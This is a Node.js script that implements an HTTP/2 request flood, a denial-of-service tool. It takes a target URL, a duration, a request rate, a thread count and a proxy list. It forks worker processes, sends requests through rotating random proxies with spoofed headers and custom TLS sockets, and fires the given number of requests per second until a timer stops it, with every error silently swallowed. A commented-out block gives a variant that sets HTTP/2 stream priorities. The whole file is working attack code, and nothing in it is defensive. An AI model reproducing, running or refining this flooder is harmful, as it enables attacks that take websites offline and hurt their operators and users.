const url = require('url');
const http2 = require("http2");
const cluster = require('cluster');
const HeaderUtils = require('./HeaderUtils.js');
const ProxyUtils = require('./ProxyUtils.js');
const TLSUtils = require('./TLSUtils.js');
const EventEmitter = require("events").EventEmitter;

EventEmitter.defaultMaxListeners = 0;

function ErrorLogger(error)
{

}

process.on("uncaughtException", ErrorLogger);
process.on("unhandledRejection", ErrorLogger);
process.on("warning", ErrorLogger);
process.setMaxListeners(0);

const [, , target, time, rps, threads, ProxyPath] = process.argv;

if (!target || !time || !threads) 
{
    process.exit(1);
}

const Window = Math.round(1797559 * rps);
const PARSED_URL = url.parse(target);
const ProxySocket = new TLSUtils.NetSocket();
const proxyManager = new ProxyUtils.ProxyManager(ProxyPath);
const http2Settings = 
{ 
    headerTableSize: 65536,
    enablePush: false,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144
};


if (cluster.isMaster) 
{
    for (let counter = 1; counter < threads; counter++) 
    {
        cluster.fork();
    }
} 
else 
{
    setInterval(fullSendBoys);
}

function getProxyOptions(proxyAddress) 
{
    const [proxyHost, proxyPort] = proxyAddress.split(':');
    return {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: PARSED_URL.host
    };
}

function fullSendBoys() 
{
    const proxyAddress = proxyManager.getRandomProxy();
    const proxyOptions = getProxyOptions(proxyAddress);
    ProxySocket.HTTP(proxyOptions, function(connection, error) 
    {
        if (error) return;
        const requestData = HeaderUtils.getHeaders(PARSED_URL, { Get: true, spoof: true });
        const http2Client = http2.connect(PARSED_URL.href, 
        {
            settings: http2Settings,
            createConnection: () => TLSUtils.createCustomTLSSocket(connection, PARSED_URL)
        });
        http2Client.on("connect", (session, socket) => 
        {
            socket.allowHalfOpen = true;
            session.setLocalWindowSize(Window);
            setInterval(function() 
            {
                const requests_storage = [];
                for (let i = 0; i < rps; i++)  
                {
                    requests_storage.push(Build(http2Client, requestData));
                }
                Promise.all(requests_storage).then().finally(() => 
                {
                    http2Client.close(http2.constants.NGHTTP2_CANCEL);
                });
            }, 1000);
        });
    });
}

function Build(http2Client, requestData) 
{
    return new Promise((resolve, reject) => 
    {
        const stream = http2Client.request(requestData);
        stream.setEncoding('utf8');
        stream.end();
    });
}

function Stop() 
{
    ProxySocket.destroyAllconnections();
    process.exit(-1);
}

setTimeout(Stop, time * 1000);

/*const requests = [];
for (let i = 0; i < rps; i++) 
{
    requests.push(Request(http2Client, requestData, i));
}
Promise.all(requests).then().finally(() => 
{
    http2Client.close(http2.constants.NGHTTP2_CANCEL);
}); */

/*function Request(http2Client, requestData, offset) 
{
    return new Promise((resolve, reject) => 
    {
        const ParentOffset = offset === 0 ? 0 : 1;
        const WeightOffset = offset !== 0 ? 241 : 42;
        const stream = http2Client.request(requestData, { weight: WeightOffset, parent: ParentOffset, exclusive: false, }); 
        stream.setEncoding('utf8');
        stream.end();
    });
}*/